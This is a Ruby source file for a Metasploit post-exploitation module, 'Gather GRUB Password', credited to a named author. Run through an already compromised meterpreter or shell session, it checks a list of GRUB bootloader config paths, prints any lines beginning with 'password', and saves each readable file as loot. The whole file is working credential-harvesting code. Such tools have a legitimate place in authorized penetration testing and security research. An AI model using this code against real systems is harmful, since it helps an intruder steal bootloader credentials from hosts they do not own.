##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Gather GRUB Password',
      'Description'  => %q{
        This module gathers GRUB passwords from GRUB bootloader config files.
      },
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Garvit Dewan <d.garvit[at]gmail.com>' # @dgarvit
        ],
      'Platform'     => ['linux', 'osx', 'unix', 'solaris', 'bsd'],
      'SessionTypes' => ['meterpreter', 'shell'],
      'References'   => [
        ['URL', 'https://help.ubuntu.com/community/Grub2/Passwords#Password_Encryption']
      ]
    ))
  end

  def run
    targets = [
      '/boot/grub/grub.conf',
      '/boot/grub/grub.cfg',
      '/etc/grub.conf',
      '/etc/grub/grub.cfg',
      '/etc/grub.d/00_header',
      '/mnt/sysimage/boot/grub.conf',
      '/mnt/boot/grub/grub.conf',
      '/rpool/boot/grub/grub.cfg'
    ]

    targets.each do |target|
      next unless file?(target) and readable?(target)
      print_status("Reading #{target}")
      file = read_file(target)
      found = false
      file.each_line do |line|
        line = line.strip
        if line.start_with?("password")
          print_good("Found password: #{line}")
          found = true
        end
      end

      if !found
        print_status("No passwords found in GRUB config file: #{target}")
      end
      file_loc = store_loot("#{target}", "text/plain", session, file)
      print_good("#{target} saved to #{file_loc}")
    end
  end
end
